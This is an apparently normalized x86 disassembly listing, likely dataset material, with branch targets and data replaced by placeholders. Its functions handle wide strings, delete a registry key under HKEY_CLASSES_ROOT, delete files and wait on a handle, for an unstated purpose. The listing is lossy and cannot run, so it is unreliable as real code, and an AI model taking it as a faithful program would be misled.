sub_401000
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jmp r-xdata
jne r-xdata
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
xor eax eax
movzx eax [ ecx ]
cmp ax [ edx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add ecx 0x2
add edx 0x2
dec esi
pop esi
pop ebp
retn
sub_40102f
xor edx edx
cmp [ ecx ] dx
je r-xdata
mov eax edx
retn
push esi
lea esi [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax dx
jne r-xdata
mov edx ecx
sub edx esi
sar edx 0x1
pop esi
sub_40104f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn
add eax eax
push eax
push edx
push ecx
call sub_410100
add esp 0xc
mov ecx eax
sub_40106c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax ecx
pop ebp
retn
add eax eax
push eax
push edx
push ecx
call sub_40e0b0
add esp 0xc
mov ecx eax
sub_401089
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
lea edx [ eax + 0x1 ]
xor eax eax
pop ebp
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_4010a6
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40e8f2#2
pop ecx
sub_4010c6
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_4010f7
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_4010c6
leave
retn 0x8
sub_401116
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_401139
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_40def1
pop ecx
test eax eax
mov ecx r--data
cmovne ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401fea
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_40116a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401139
mov ecx [ ebp + 0x8 ]
push r--data
call sub_401fea
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_40119f
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_40df1b
pop ecx
test eax eax
mov ecx r--data
cmovne ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401fea
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_4011ca
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40def1
test eax eax
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] esi
je r-xdata
mov [ eax + 0x4 ] rw-data
mov [ eax + 0x4 ] rw-data
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_4011f6
mov [ ecx ] r--data
push esi
xor edx edx
mov [ ecx + 0x14 ] edx
xor eax eax
push 0x7
pop esi
mov [ ecx + 0x18 ] esi
mov [ ecx + 0x4 ] ax
mov [ ecx + 0x30 ] esi
mov [ ecx + 0x2c ] edx
mov [ ecx + 0x1c ] ax
mov [ ecx + 0x48 ] esi
mov [ ecx + 0x44 ] edx
mov [ ecx + 0x34 ] ax
mov [ ecx + 0x60 ] esi
mov [ ecx + 0x5c ] edx
mov [ ecx + 0x4c ] ax
mov [ ecx + 0x78 ] esi
mov [ ecx + 0x74 ] edx
mov [ ecx + 0x64 ] ax
mov eax ecx
pop esi
retn
sub_40123a
push 0x0
mov eax sub_41d0a9
call sub_410868
and [ ebp - 0x4 ] 0x0
add ecx 0x4
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
call sub_410836
retn 0x18
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_401272
push 0x0
mov eax sub_41d0a9
call sub_410868
and [ ebp - 0x4 ] 0x0
add ecx 0x1c
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
call sub_410836
retn 0x18
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_4012aa
push 0x0
mov eax sub_41d0a9
call sub_410868
and [ ebp - 0x4 ] 0x0
add ecx 0x34
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
call sub_410836
retn 0x18
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_4012e2
push 0x0
mov eax sub_41d0a9
call sub_410868
and [ ebp - 0x4 ] 0x0
add ecx 0x4c
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
call sub_410836
retn 0x18
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_40131a
push 0x0
mov eax sub_41d0a9
call sub_410868
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
call sub_410836
retn 0x18
add ecx 0x64
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_40223f
sub_401358
push ebx
push esi
push edi
mov esi ecx
xor ebx ebx
xor edi edi
push ebx
inc edi
push edi
lea ecx [ esi + 0x64 ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x4c ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x34 ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x1c ]
call sub_4023e7
push ebx
push edi
lea ecx [ esi + 0x4 ]
call sub_4023e7
pop edi
pop esi
pop ebx
retn
sub_401398
push 0x4c
mov eax sub_41d07c
call sub_41089b
mov esi ecx
mov [ ebp - 0x3c ] esi
and [ ebp - 0x30 ] 0x0
mov [ ebp - 0x58 ] esi
xor ebx ebx
inc ebx
push r--data
mov [ ebp - 0x4 ] ebx
call sub_402085
mov edi r--data
mov ecx edi
mov [ ebp - 0x30 ] ebx
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp + 0x8 ]
call sub_40234d
cmp eax 0xffffffff
je r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push ecx
push edi
lea ecx [ ebp + 0x8 ]
call sub_40234d
cmp eax 0xffffffff
je r-xdata
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push edi
mov ecx esi
call sub_402546
mov edi r--data
mov ecx edi
call sub_40102f
push eax
push edi
mov ecx esi
call sub_402546
mov eax [ ebp + 0x18 ]
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x38 ] eax
xor eax eax
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x28 ] ax
call sub_4022ce
mov eax [ ebp - 0x38 ]
xor edi edi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x34 ] 0x0
test eax eax
jle r-xdata
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x54 ]
call sub_402bb0
pop ecx
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_4024a4
push 0x0
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_4023e7
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
jmp r-xdata
lea ecx [ eax + 0x1 ]
mov esi eax
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
mov eax esi
call sub_41084a
retn
xor eax eax
mov [ ebp - 0x29 ] 0x0
inc eax
and [ ebp - 0x44 ] 0x0
xor eax eax
push 0x5
mov [ ebp - 0x54 ] ax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x40 ] 0x7
call sub_40223f
mov [ ebp - 0x4 ] 0x3
or ebx 0x2
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x30 ] ebx
call sub_402b8b
test al al
je r-xdata
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x29 ] 0x0
movzx ecx cl
push 0x1
pop edx
cmovne ecx edx
mov [ ebp - 0x34 ] ecx
test cl cl
je r-xdata
push 0x0
and ebx 0xfffffffd
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x30 ] ebx
call sub_4023e7
xor eax eax
inc eax
mov [ ebp - 0x29 ] al
jmp r-xdata
inc edi
lea ecx [ esi + 0x1 ]
cmp edi esi
jl r-xdata
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
cmp [ eax + edi * 2 ] 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x2
test bl 0x2
je r-xdata
lea eax [ edi + 0x5 ]
cmp eax ecx
jg r-xdata
mov esi [ ebp - 0x3c ]
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
movzx eax [ eax + edi * 2 ]
push eax
push edx
call sub_4021dc
sub_401570
push 0x184
mov eax sub_41d014
call sub_410868
mov esi ecx
call sub_408e5d
xor ebx ebx
cmp eax 0x9
ja r-xdata
push r--data
lea ecx [ ebp - 0x190 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x6
call sub_408b56
lea ecx [ ebp - 0x190 ]
jmp [ eax * 4 + jump_table_4017b4 ]
push r--data
lea ecx [ ebp - 0xe8 ]
call sub_401fea
mov [ ebp - 0x4 ] ebx
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xe8 ]
call sub_40203c
mov eax [ esi ]
push 0x15
lea ecx [ ebp - 0x58 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x58 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x1
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x148 ]
call sub_40203c
mov eax [ esi ]
push 0xd
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x88 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x118 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x2
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x118 ]
call sub_40203c
mov eax [ esi ]
push 0xe
lea ecx [ ebp - 0xb8 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x178 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x3
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x178 ]
call sub_40203c
mov eax [ esi ]
push 0xf
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x28 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x4
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_40203c
mov eax [ esi ]
push 0x10
lea ecx [ ebp - 0x70 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x70 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0xa0 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x5
call sub_408b56
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa0 ]
call sub_40203c
mov eax [ esi ]
push 0x11
lea ecx [ ebp - 0xd0 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
lea ecx [ ebp - 0xd0 ]
jmp r-xdata
sub esp 0x18
mov ecx esp
push r--data
call sub_402085
mov eax [ esi ]
lea ecx [ ebp - 0x100 ]
push ecx
mov ecx esi
call [ eax ]
lea ecx [ ebp - 0x100 ]
jmp r-xdata
sub esp 0x18
mov ecx esp
push r--data
call sub_402085
mov eax [ esi ]
lea ecx [ ebp - 0x130 ]
push ecx
mov ecx esi
call [ eax ]
lea ecx [ ebp - 0x130 ]
mov eax [ esi ]
push 0x2
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx esi
mov bl 0x1
call [ eax + 0x4 ]
lea ecx [ ebp - 0x160 ]
jmp r-xdata
call sub_40203c
mov al bl
call sub_410836
retn
call sub_40203c
sub_4017dc
push 0x174
mov eax sub_41d1ac
call sub_41089b
mov edi edx
mov esi ecx
call sub_40886e
mov [ ebp - 0x129 ] al
xor eax eax
xor ebx ebx
push r--data
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x74 ] 0x7
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] ax
call sub_4022ce
sub esp 0x18
mov ecx esp
push esi
mov [ ebp - 0x4 ] ebx
call sub_402085
lea ecx [ ebp - 0x168 ]
call sub_401398
add esp 0x18
lea ecx [ ebp - 0x88 ]
push eax
call sub_4020cf
push ebx
push 0x1
lea ecx [ ebp - 0x168 ]
call sub_4023e7
push esi
lea ecx [ ebp - 0x168 ]
call sub_402085
push ecx
lea edx [ ebp - 0x168 ]
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x1
call sub_4086ea
pop ecx
push eax
mov edx r--data
lea ecx [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0x2
call sub_402c1a
pop ecx
mov [ ebp - 0x4 ] 0x3
call sub_408b56
lea ecx [ ebp - 0x180 ]
call sub_40203c
lea ecx [ ebp - 0x148 ]
call sub_40203c
push ebx
push 0x1
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x4 ] bl
call sub_4023e7
push ecx
lea edx [ ebp - 0x88 ]
lea ecx [ ebp - 0x180 ]
call sub_4086ea
pop ecx
push eax
mov edx r--data
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x4
call sub_402c1a
pop ecx
mov [ ebp - 0x4 ] 0x5
call sub_408b56
lea ecx [ ebp - 0x148 ]
call sub_40203c
lea ecx [ ebp - 0x180 ]
mov [ ebp - 0x4 ] bl
call sub_40203c
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x6
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] bl
call sub_40203c
mov eax [ edi ]
push 0x1
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
lea ecx [ ebp - 0x28 ]
call sub_40843c
push 0x50
mov [ ebp - 0x4 ] 0x7
call sub_40e73f
mov esi eax
pop ecx
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x4 ] 0x8
test esi esi
je r-xdata
xor esi esi
mov [ ebp - 0x4 ] 0x7
inc esi
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x4c ] ebx
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x14c ] esp
push eax
call sub_402085
sub esp 0x18
mov ecx esp
push r--data
mov [ ebp - 0x4 ] 0x9
call sub_402085
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_40a4f0
mov ebx eax
cmp esi 0x5
jne r-xdata
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0xa
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x7
call sub_40203c
inc esi
cmp esi 0x5
jle r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
push 0x4
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0xb
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x7
call sub_40203c
xor ebx ebx
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0xd8 ] ebx
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xd0 ] ebx
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xac ] ebx
mov [ ebp - 0x8c ] ebx
call sub_40b4a3
mov [ ebp - 0x4 ] 0xc
mov esi [ ebp - 0x8c ]
test esi esi
je r-xdata
mov ecx ebx
call sub_40aaab
test eax eax
je r-xdata
mov bl [ ebp - 0x129 ]
test bl bl
jne r-xdata
mov ecx edi
call sub_40aca0
push r--data
push 0x80000000
mov [ ebp - 0x8c ] eax
call [ SHDeleteKeyW@IAT ]
lea ecx [ ebp - 0x128 ]
call sub_40b5c4
mov ecx edi
call sub_401570
test al al
jne r-xdata
mov ecx esi
call sub_401358
push esi
call j_sub_40e8f2#2
pop ecx
mov [ ebp - 0x8c ] ebx
mov eax [ edi ]
push 0x5
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
xor bl bl
jmp r-xdata
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x70 ]
call sub_4084d3
push r--data
lea edx [ ebp - 0x70 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0xd
call sub_402bb0
pop ecx
lea edx [ ebp - 0x40 ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0xe
call sub_4085c2
mov bl [ ebp - 0x129 ]
mov esi [ DeleteFileW@IAT ]
mov bh al
test bl bl
jne r-xdata
mov bl [ ebp - 0x129 ]
test bl bl
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
push 0x0
push 0x1
lea ecx [ ebp - 0x88 ]
call sub_4023e7
mov al bl
call sub_41084a
retn
mov eax [ edi ]
lea ecx [ ebp - 0x148 ]
test bh bh
jne r-xdata
cmp [ ebp - 0x14 ] 0x8
lea ecx [ ebp - 0x28 ]
cmovae ecx [ ebp - 0x28 ]
push ecx
call esi
xor bl bl
jmp r-xdata
cmp [ ebp - 0x14 ] 0x8
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call [ DeleteFileW@IAT ]
push 0x6
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
cmp [ ebp - 0x5c ] 0x8
lea edx [ ebp - 0x70 ]
cmovae edx [ ebp - 0x70 ]
cmp [ ebp - 0x2c ] 0x8
lea ecx [ ebp - 0x40 ]
cmovae ecx [ ebp - 0x40 ]
call sub_405e52
mov [ ebp - 0x130 ] eax
test bl bl
jne r-xdata
push 0x7
jmp r-xdata
lea ecx [ ebp - 0x128 ]
call sub_40b547
test eax eax
mov eax [ edi ]
lea ecx [ ebp - 0x148 ]
je r-xdata
cmp [ ebp - 0x2c ] 0x8
lea ecx [ ebp - 0x40 ]
cmovae ecx [ ebp - 0x40 ]
push ecx
call esi
mov eax [ ebp - 0x130 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
xor bl bl
jmp r-xdata
push 0x8
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0xf
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xe
call sub_40203c
xor eax eax
push 0xffffffff
xor ebx ebx
mov [ ebp - 0x58 ] ax
push ebx
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x44 ] 0x7
mov [ ebp - 0x48 ] ebx
call sub_40223f
mov esi r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x10
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_402546
mov esi r--data
mov ecx esi
call sub_40102f
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_402546
push 0xffffffff
push ebx
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_4024a4
lea eax [ ebp - 0x129 ]
push eax
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x129 ] bl
call sub_408951
mov bl al
pop ecx
test bl bl
je r-xdata
push 0x9
push 0x0
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_4023e7
push 0x0
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_4023e7
mov eax [ edi ]
push 0xb
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x12
call sub_408b56
mov [ ebp - 0x4 ] 0x10
push 0x493e0
push [ ebp - 0x130 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x130 ]
call [ CloseHandle@IAT ]
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x11
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x10
call sub_40203c
mov eax [ edi ]
push 0xa
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_4023e7
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x14
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x10
call sub_40203c
push r--data
lea ecx [ ebp - 0x148 ]
call sub_401fea
mov [ ebp - 0x4 ] 0x15
call sub_408b56
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x10
call sub_40203c
mov eax [ edi ]
push 0xc
lea ecx [ ebp - 0x148 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
lea ecx [ ebp - 0x148 ]
call sub_40203c
mov bl 0x1
lea ecx [ ebp - 0x148 ]
call sub_40203c
push ecx
lea edx [ ebp - 0x70 ]
lea ecx [ ebp - 0x148 ]
call sub_4086ea
pop ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x13
call sub_4089df
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x10
call sub_40203c
test bl bl
je r-xdata
sub_401e79
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea ecx [ esp + 0x88 ]
call sub_4011f6
push r--data
lea ecx [ esp + 0x44 ]
call sub_402085
push 0xffffffff
xor ebx ebx
push ebx
lea eax [ esp + 0x48 ]
push eax
lea ecx [ esp + 0x98 ]
call sub_40223f
push ebx
push 0x1
lea ecx [ esp + 0x48 ]
call sub_4023e7
push r--data
lea ecx [ esp + 0x14 ]
call sub_402085
push 0xffffffff
push ebx
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0xb0 ]
call sub_40223f
push ebx
push 0x1
lea ecx [ esp + 0x18 ]
call sub_4023e7
push r--data
lea ecx [ esp + 0x2c ]
call sub_402085
push 0xffffffff
push ebx
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0xc8 ]
call sub_40223f
push ebx
push 0x1
lea ecx [ esp + 0x30 ]
call sub_4023e7
push r--data
lea ecx [ esp + 0x5c ]
call sub_402085
push 0xffffffff
push ebx
lea eax [ esp + 0x60 ]
push eax
lea ecx [ esp + 0xe0 ]
call sub_40223f
push ebx
push 0x1
lea ecx [ esp + 0x60 ]
call sub_4023e7
xor eax eax
lea ecx [ esp + 0x70 ]
mov [ esp + 0x84 ] 0x7
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] ax
call sub_408c22
test al al
je r-xdata
lea edx [ esp + 0x88 ]
mov ecx esi
call sub_4017dc
push ebx
push 0x1
lea ecx [ esp + 0x78 ]
call sub_4023e7
lea ecx [ esp + 0x88 ]
call sub_401358
mov ecx [ esp + 0x10c ]
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_40e09b
mov esp ebp
pop ebp
retn 0x10
cmp [ esp + 0x84 ] 0x8
lea eax [ esp + 0x70 ]
cmovae eax [ esp + 0x70 ]
sub esp 0x18
mov ecx esp
push eax
call sub_402085
lea ecx [ esp + 0xa0 ]
call sub_40131a
sub_401fea
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
call sub_401089
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_40242b
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402019
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
call sub_4020fe
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40205d
push ebp
mov ebp esp
push esi
xor eax eax
push 0xffffffff
mov esi ecx
push eax
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_40223f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402085
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
xor eax eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_4022ce
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4020aa
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
xor eax eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_402190
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4020cf
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x0
push 0x1
call sub_4023e7
push [ ebp + 0x8 ]
mov ecx esi
call sub_402190
sub_4020fe
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x10
mov edi ecx
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
and [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
pop edi
mov [ esi ] 0x0
pop esi
pop ebp
retn 0x4
push eax
push esi
push edi
call sub_40e0b0
add esp 0xc
jmp r-xdata
sub_40214c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call j_sub_40e8f2#2
pop ecx
pop ebx
push edi
push ebx
push esi
call sub_410100
add esp 0xc
sub_402190
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ esi + 0x14 ] 0x8
mov edi ecx
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x10 ]
inc eax
push eax
mov edx esi
call sub_40106c
pop ecx
jmp r-xdata
and [ esi ] 0x0
mov eax [ esi ]
mov [ edi ] eax
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x7
xor eax eax
pop edi
mov [ esi ] ax
pop esi
